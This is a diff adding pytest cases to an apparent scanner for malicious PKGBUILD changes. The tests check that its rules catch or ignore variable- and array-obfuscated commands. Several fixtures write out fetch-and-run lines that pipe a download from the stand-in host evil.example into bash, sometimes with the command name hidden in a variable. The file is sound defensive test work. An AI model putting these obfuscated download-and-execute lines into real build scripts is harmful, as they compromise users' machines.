@@ -115,6 +115,64 @@ def test_x002_stands_down_when_the_tokenizer_resolved_the_name():
     assert "R001" in fired, "the resolved payload must still be caught"
 
 
+def test_x002_stands_down_for_a_resolved_array_element():
+    """`A=(curl)` then `${A[0]}` resolves the same way a scalar does.
+
+    The array table is part of what the tokenizer can read, so the static
+    subscript is a spelling choice; only an unresolved subscript is X002's.
+    """
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  A=(curl)\n+  ${A[0]} -fsSL https://evil.example | bash\n }\n")
+    assert "X002" not in set(crossfire_techniques(diff))
+
+    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+    assert "R001" in fired, "the resolved payload must still be caught"
+
+
+def test_x002_still_fires_on_a_dynamic_array_subscript():
+    """`${A[$i]}` does not resolve, so the command name stays hidden."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  A=(curl)\n+  ${A[$i]} -fsSL https://evil.example | bash\n }\n")
+    assert "X002" in set(crossfire_techniques(diff))
+
+
+@pytest.mark.parametrize("spelling", [
+    '"$_system_wasm_bindgen"',   # ruffle-nightly
+    '"${_client}"',              # securelink
+    '"${_appimage}"',            # steamcommunity302
+])
+def test_x002_stands_down_for_a_quoted_resolved_variable(spelling):
+    """A quoted resolved scalar is a spelling choice, not a hidden name.
+
+    The old word test allowed a leading quote but not a closing one, so
+    `if "$_system_wasm_bindgen"` read as an unresolvable command word at
+    CRITICAL while the value sat one line above.
+    """
+    name = spelling.strip('"').strip("${}")
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n pkgname=p\n"
+            f"+{name}=false\n+  if {spelling}; then :; fi\n")
+    assert "X002" not in set(crossfire_techniques(diff))
+
+
+def test_x023_stands_down_when_resolution_names_the_fetch():
+    """The pipeline rules read the resolved text: `C=curl` is R001's."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  C=curl\n+  $C -fsSL https://evil.example | bash\n }\n")
+    assert "X023" not in set(crossfire_techniques(diff))
+
+    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
+    assert "R001" in fired
+
+
+def test_x009_claims_a_resolved_uncatalogued_fetch():
+    """`C=aria2c` is a fetch after resolution, and X009 owns it, not X023."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  C=aria2c\n+  $C -fsSL https://evil.example | bash\n }\n")
+    techniques = set(crossfire_techniques(diff))
+    assert "X009" in techniques
+    assert "X023" not in techniques
+
+
 NOT_COMMANDS = [
     # Each of these fired on the benign corpus before it was excluded.
     ("assignment-rhs",     'font=`grep -o -e "THE FONT" License.rtf | head -1`'),
@@ -875,6 +933,33 @@ def test_x024_quiet_on_literal_assignment(command):
     assert "X024" not in _fire(command)
 
 
+@pytest.mark.parametrize("command", [
+    'export PATH="$PATH:$HOME/.cargo/bin"',
+    'MAKEFLAGS="$MAKEFLAGS -j$(nproc)"',
+    'export CGO_CPPFLAGS="${CPPFLAGS}"',
+    'export CGO_CFLAGS="${CFLAGS}"',
+    'export CGO_CXXFLAGS="${CXXFLAGS}"',
+    'export CGO_LDFLAGS="${LDFLAGS}"',
+])
+def test_x024_quiet_on_a_passthrough(command):
+    """The value begins by expanding the assigned variable itself.
+
+    `PATH="$PATH:..."` appends and `CGO_CFLAGS="${CFLAGS}"` forwards the
+    standard flags; both are the value the reviewer already sees, not an
+    indirect value hidden in a variable.
+    """
+    assert "X024" not in _fire(command)
+
+
+@pytest.mark.parametrize("command", [
+    'CGO_CFLAGS="$EVIL"',
+    'CFLAGS="${_evil}"',
+    'PATH="${_newpath}"',
+])
+def test_x024_still_fires_when_the_value_is_not_the_same_variable(command):
+    assert "X024" in _fire(command)
+
+
 # ---------------------------------------------------------------------------
 # X025: multi-line function shadow
 # ---------------------------------------------------------------------------
@@ -917,3 +1002,53 @@ def test_x025_quiet_on_single_line_shadow():
             " pkgname=demo\n"
             "+msg() { echo 'clean'; }\n")
     assert "X025" not in set(crossfire_techniques(diff))
+
+
+# ---------------------------------------------------------------------------
+# Data that spells a command: dependency descriptions and printed heredocs
+# ---------------------------------------------------------------------------
+
+
+def test_x011_ignores_a_dependency_description():
+    """lfff: an optdepends description that *describes* a cargo install.
+
+    The value of a dependency array is data.  The parenthesised
+    `cargo install payload_dumper` is how a user would install the
+    optional tool, not a command the build runs.
+    """
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n"
+            " pkgname=demo\n"
+            "+optdepends=(\n"
+            "+  'payload_dumper: OTA payload extraction "
+            "(cargo install payload_dumper)'\n"
+            "+)\n")
+    assert "X011" not in set(crossfire_techniques(diff))
+
+
+def test_x011_still_fires_on_the_line_that_runs_it():
+    assert "X011" in _fire("cargo install wasm-bindgen-cli")
+
+
+def test_x015_ignores_a_printed_heredoc():
+    """melody-git: `cat <<'MESSAGE'` advises the user to enable a unit.
+
+    The body is a message.  Following it into X015 made a printed
+    instruction look like work scheduled on the building machine.
+    """
+    diff = ("--- a/melody.install\n+++ b/melody.install\n@@ -0,0 +1,5 @@\n"
+            "+post_install() {\n"
+            "+  cat <<'MESSAGE'\n"
+            "+  systemctl --user enable --now melody-agent.service\n"
+            "+MESSAGE\n"
+            "+}\n")
+    assert "X015" not in set(crossfire_techniques(diff))
+
+
+def test_x015_still_fires_on_a_heredoc_handed_to_a_shell():
+    diff = ("--- a/x.install\n+++ b/x.install\n@@ -0,0 +1,5 @@\n"
+            "+post_install() {\n"
+            "+  cat <<EOF | sh\n"
+            "+  systemctl --user enable --now x.service\n"
+            "+EOF\n"
+            "+}\n")
+    assert "X015" in set(crossfire_techniques(diff))
